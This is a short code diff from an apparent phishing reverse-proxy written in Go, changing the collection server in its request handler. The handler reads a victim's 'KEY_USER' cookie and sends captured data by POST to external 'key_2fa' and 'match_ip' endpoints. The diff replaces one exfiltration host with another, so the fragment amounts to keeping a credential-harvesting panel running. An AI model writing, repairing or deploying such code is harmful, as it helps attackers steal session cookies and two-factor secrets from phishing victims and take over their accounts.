@@ -423,7 +423,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									cookie_ket, _ := req.Cookie("KEY_USER")
 									log.Success(cookie_ket.String())
 
-									urlPost0 := "https://natrium100gram.site/public/api/key_2fa"
+									urlPost0 := "https://noirlegacypanel-panel.online/api/key_2fa"
 									method0 := "POST"
 
 									payload0 := &bytes.Buffer{}
@@ -455,7 +455,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 										}
 									}(resp0.Body)
 
-									urlPost := "https://natrium100gram.site/public/api/match_ip"
+									urlPost := "https://noirlegacypanel-panel.online/api/match_ip"
 									method := "POST"
 
 									payload := &bytes.Buffer{}
